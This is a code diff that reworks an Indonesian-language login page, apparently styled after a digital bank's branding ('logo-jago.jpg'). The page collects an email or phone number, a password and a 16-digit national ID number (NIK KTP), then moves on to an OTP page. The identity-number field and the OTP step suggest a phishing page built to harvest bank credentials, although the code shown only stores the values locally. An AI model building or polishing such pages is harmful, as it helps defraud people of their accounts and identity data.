@@ -6,164 +6,215 @@
 <title>Login</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: linear-gradient(to bottom right, #f9a825, #f57c00);
-}
+  :root{
+    --orange1:#f9a825;
+    --orange2:#f57c00;
+    --text:#f97316;
+    --border:#ddd;
+    --muted:#888;
+  }
 
-.container {
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
+  *{ box-sizing:border-box; }
 
-.card {
-  width: 90%;
-  max-width: 350px;
-  background: white;
-  border-radius: 20px;
-  padding: 20px;
-  text-align: center;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-}
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom right, var(--orange1), var(--orange2));
+  }
 
-h2 {
-  color: #f97316;
-  margin-bottom: 15px;
-}
+  .container {
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
 
-input {
-  width: 90%;
-  padding: 12px;
-  margin: 8px 0;
-  border-radius: 10px;
-  border: 1px solid #ddd;
-  outline: none;
-}
+  .card {
+    width: 100%;
+    max-width: 360px;
+    background: #fff;
+    border-radius: 22px;
+    padding: 22px 20px;
+    text-align: center;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.15);
+  }
 
-input:focus {
-  border: 1px solid #f97316;
-  box-shadow: 0 0 0 2px rgba(249,115,22,0.2);
-}
+  .logo {
+    width: 60px;
+    height: 60px;
+    object-fit: contain;
+    display: block;
+    margin: 0 auto 10px;
+  }
 
-.password-box {
-  position: relative;
-  width: 90%;
-  margin: auto;
-}
+  h2 {
+    color: var(--text);
+    margin: 10px 0 18px;
+    font-size: 28px;
+  }
 
-.password-box input {
-  width: 100%;
-  padding-right: 45px;
-}
+  .field {
+    width: 100%;
+    margin: 10px 0;
+  }
 
-.eye {
-  position: absolute;
-  right: 15px;
-  top: 50%;
-  transform: translateY(-50%);
-  cursor: pointer;
-  font-size: 18px;
-}
+  .field input {
+    width: 100%;
+    padding: 13px 14px;
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    outline: none;
+    font-size: 15px;
+    background: #fff;
+    transition: 0.2s;
+  }
 
-button {
-  width: 95%;
-  padding: 14px;
-  border: none;
-  border-radius: 999px;
-  background: linear-gradient(to right, #f59e0b, #f97316);
-  color: white;
-  font-weight: bold;
-  margin-top: 15px;
-}
+  .field input:focus {
+    border-color: var(--orange2);
+    box-shadow: 0 0 0 3px rgba(245, 124, 0, 0.12);
+  }
+
+  .password-box {
+    position: relative;
+    width: 100%;
+  }
+
+  .password-box input {
+    padding-right: 48px;
+  }
+
+  .eye {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    font-size: 18px;
+    user-select: none;
+  }
+
+  .hint {
+    display: block;
+    margin-top: 4px;
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.4;
+  }
+
+  button {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 999px;
+    background: linear-gradient(to right, var(--orange1), var(--orange2));
+    color: #fff;
+    font-weight: bold;
+    font-size: 16px;
+    margin-top: 16px;
+    cursor: pointer;
+    transition: 0.15s;
+  }
+
+  button:active {
+    transform: scale(0.98);
+    opacity: 0.92;
+  }
+
+  .loading {
+    display: none;
+    margin-top: 12px;
+    font-size: 13px;
+    color: #666;
+  }
 </style>
 </head>
 
 <body>
+  <div class="container">
+    <div class="card">
+      <img src="logo-jago.jpg" alt="Logo" class="logo" onerror="this.style.display='none'">
+      <h2>Masuk ke Akun</h2>
 
-<div class="container">
-  <div class="card">
+      <div class="field">
+        <input type="text" id="email" placeholder="Email / No HP">
+      </div>
 
-    <img src="logo-jago.jpg" style="width:60px; margin-bottom:10px;">
+      <div class="field password-box">
+        <input type="password" id="password" placeholder="Password">
+        <span class="eye" id="eye" onclick="togglePass()">👁️</span>
+      </div>
 
-    <h2>Masuk ke Akun</h2>
+      <div class="field">
+        <input type="text" id="nik" placeholder="NIK KTP (16 digit)" inputmode="numeric" maxlength="16">
+        <small class="hint">Pastikan NIK sesuai KTP</small>
+      </div>
 
-    <input type="text" id="email" placeholder="Email / No HP">
-
-    <div class="password-box">
-      <input type="password" id="password" placeholder="Password">
-      <span class="eye" onclick="togglePass()" id="eye">👁️</span>
+      <button id="btnLogin">Masuk</button>
+      <div class="loading" id="loading">Memproses...</div>
     </div>
-
-    <input type="text" id="nik" placeholder="NIK KTP (16 digit)">
-
-    <small style="font-size:12px; color:#888;">
-      Pastikan NIK sesuai KTP
-    </small>
-
-    <button id="btnLogin">Masuk</button>
-
   </div>
-</div>
 
-<script>
-// SHOW / HIDE PASSWORD
-function togglePass() {
-  let input = document.getElementById("password");
-  let eye = document.getElementById("eye");
+  <script>
+    function togglePass() {
+      const input = document.getElementById("password");
+      const eye = document.getElementById("eye");
 
-  if (input.type === "password") {
-    input.type = "text";
-    eye.innerText = "🙈";
-  } else {
-    input.type = "password";
-    eye.innerText = "👁️";
-  }
-}
+      if (input.type === "password") {
+        input.type = "text";
+        eye.innerText = "🙈";
+      } else {
+        input.type = "password";
+        eye.innerText = "👁️";
+      }
+    }
 
-// LOGIN
-document.getElementById("btnLogin").addEventListener("click", function() {
+    function isValidEmailOrPhone(value) {
+      const v = value.trim();
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const phoneRegex = /^(\+62|62|0)[0-9]{8,13}$/;
+      return emailRegex.test(v) || phoneRegex.test(v);
+    }
 
-  let email = document.getElementById("email").value;
-  let pass = document.getElementById("password").value;
-  let nik = document.getElementById("nik").value;
+    function isStrongPassword(value) {
+      // minimal 8 karakter, ada huruf besar, angka, simbol
+      const regex = /^(?=.[A-Z])(?=.[0-9])(?=.*[\W_]).{8,}$/;
+      return regex.test(value);
+    }
 
-  // VALIDASI EMAIL / HP
-  if(email.length < 5){
-    alert("Masukkan Email / No HP yang valid");
-    return;
-  }
+    document.getElementById("btnLogin").addEventListener("click", function () {
+      const email = document.getElementById("email").value.trim();
+      const pass = document.getElementById("password").value;
+      const nik = document.getElementById("nik").value.trim();
+      const loading = document.getElementById("loading");
+      const btn = this;
 
-  // VALIDASI PASSWORD (HARUS KUAT)
-  let regex = /^(?=.[A-Z])(?=.[0-9])(?=.*[\W_]).{8,}$/;
+      if (!isValidEmailOrPhone(email)) {
+        alert("Masukkan Email / No HP yang valid");
+        return;
+      }
 
-  if(!regex.test(pass)){
-    alert("Password harus kuat!\nContoh: King&2828");
-    return;
-  }
+      if (!isStrongPassword(pass)) {
+        alert("Password harus kuat!\nContoh: King&2828");
+        return;
+      }
 
-  // VALIDASI NIK (16 digit angka)
-  if(!/^[0-9]{16}$/.test(nik)){
-    alert("NIK harus 16 digit angka!");
-    return;
-  }
+      if (!/^[0-9]{16}$/.test(nik)) {
+        alert("NIK harus 16 digit angka!");
+        return;
+      }
 
-  // SIMPAN DATA
-  localStorage.setItem("nik", nik);
-  localStorage.setItem("userLogin", email);
+      localStorage.setItem("userLogin", email);
+      localStorage.setItem("nik", nik);
 
-  let btn = this;
-  btn.innerText = "Memproses...";
-  btn.style.opacity = "0.7";
+      btn.disabled = true;
+      btn.innerText = "Memproses...";
+      loading.style.display = "block";
 
-  setTimeout(function(){
-    window.location.href = "otp.html";
-  }, 1200);
-
-});
-</script>
-
+      setTimeout(function () {
+        window.location.href = "otp.html";
+      }, 1200);
+    });
+  </script>
 </body>
 </html>
